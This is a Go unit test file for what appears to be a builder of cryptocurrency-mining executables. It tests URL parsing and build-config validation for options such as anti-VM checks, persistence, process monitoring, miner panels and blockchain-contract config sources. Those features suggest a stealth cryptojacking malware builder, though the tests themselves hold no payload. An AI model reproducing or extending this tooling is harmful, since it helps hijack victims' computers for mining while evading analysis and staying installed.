package main

import (
	"strings"
	"testing"
	"time"
)

func TestSplitURLs(t *testing.T) {
	tests := []struct {
		name    string
		in      string
		want    int
		wantErr bool
	}{
		{"empty", "", 0, false},
		{"single", "https://panel.example.com/api/miners/submit", 1, false},
		{"multi with spaces", "https://a.example/x, https://b.example/y ", 2, false},
		{"trailing comma", "https://a.example/x,", 1, false},
		{"ftp rejected", "ftp://a.example/x", 0, true},
		{"no scheme", "panel.example.com/x", 0, true},
		{"no host", "https:///x", 0, true},
		{"quote injection", `https://a.example/"onmouseover`, 0, true},
		{"backslash injection", `https://a.example/\n"`, 0, true},
		{"space inside", "https://a.example/a b", 0, true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, err := splitURLs(tc.in)
			if tc.wantErr {
				if err == nil {
					t.Fatalf("expected error for %q, got %v", tc.in, got)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if len(got) != tc.want {
				t.Fatalf("want %d URLs, got %d (%v)", tc.want, len(got), got)
			}
		})
	}
}

func TestValidate(t *testing.T) {
	valid := func() BuildConfig {
		c := defaultBuildConfig()
		c.PanelURLs = "https://panel.example.com/api/miners/submit"
		return c
	}

	tests := []struct {
		name    string
		mutate  func(*BuildConfig)
		wantErr string
	}{
		{"defaults ok", func(*BuildConfig) {}, ""},
		{"no config source", func(c *BuildConfig) { c.PanelURLs = "" }, "no config source"},
		{"contract and config url", func(c *BuildConfig) {
			c.ConfigURLs = "https://cfg.example/x"
			c.ContractAddress = "0x1234567890123456789012345678901234567890"
		}, "mutually exclusive"},
		{"bad contract", func(c *BuildConfig) { c.ContractAddress = "0x1234" }, "20-byte address"},
		{"no miner", func(c *BuildConfig) { c.CPUMiner = false }, "no miner selected"},
		{"name with path", func(c *BuildConfig) { c.Name = "../evil.exe" }, "file name"},
		{"zero jobs", func(c *BuildConfig) { c.Jobs = 0 }, "-jobs"},
		{"config url only", func(c *BuildConfig) { c.PanelURLs = ""; c.ConfigURLs = "https://cfg.example/x" }, ""},
		{"contract only", func(c *BuildConfig) {
			c.PanelURLs = ""
			c.ContractAddress = "0x1234567890123456789012345678901234567890"
		}, ""},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			c := valid()
			tc.mutate(&c)
			err := c.Validate()
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("unexpected error: %v", err)
				}
				return
			}
			if err == nil || !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("want error containing %q, got %v", tc.wantErr, err)
			}
		})
	}
}

func TestValidateNormalisesDefaults(t *testing.T) {
	c := defaultBuildConfig()
	c.PanelURLs = "https://panel.example.com/api/miners/submit"
	c.Output = ""
	c.EmbeddedConfig = ""
	c.Timeout = 0
	if err := c.Validate(); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if c.Output != "dist" {
		t.Errorf("output default = %q, want dist", c.Output)
	}
	if c.EmbeddedConfig != "auto" {
		t.Errorf("embedded default = %q, want auto", c.EmbeddedConfig)
	}
	if c.Jobs < 1 {
		t.Errorf("jobs = %d, want >= 1", c.Jobs)
	}
	if c.Timeout != 30*time.Minute {
		t.Errorf("timeout = %v, want 30m", c.Timeout)
	}
}

func TestFileConfigApplyPartial(t *testing.T) {
	yes, no := true, false
	fc := fileConfig{
		PanelURLs:         strPtr("https://panel.example.com/api/miners/submit"),
		AntiVMAlt:         &yes,
		CPUMiner:          &no,
		GPUMiner:          &yes,
		Jobs:              intPtr(3),
		ProcessMonitoring: &yes,
	}

	c := defaultBuildConfig()
	fc.apply(&c)

	if c.PanelURLs != "https://panel.example.com/api/miners/submit" {
		t.Errorf("panel urls = %q", c.PanelURLs)
	}
	if !c.AntiVM {
		t.Error("anti_vm alias was not applied")
	}
	if c.CPUMiner {
		t.Error("cpu_miner override was not applied")
	}
	if !c.GPUMiner {
		t.Error("gpu_miner override was not applied")
	}
	if c.Jobs != 3 {
		t.Errorf("jobs = %d, want 3", c.Jobs)
	}
	if !c.Monitoring {
		t.Error("process_monitoring should map to Monitoring")
	}
	if c.Output != "dist" || c.Name != "corvus.exe" {
		t.Error("absent JSON fields must not clobber defaults")
	}
	if c.Persistence {
		t.Error("absent persistence must stay false")
	}
}

func strPtr(s string) *string { return &s }
func intPtr(i int) *int       { return &i }
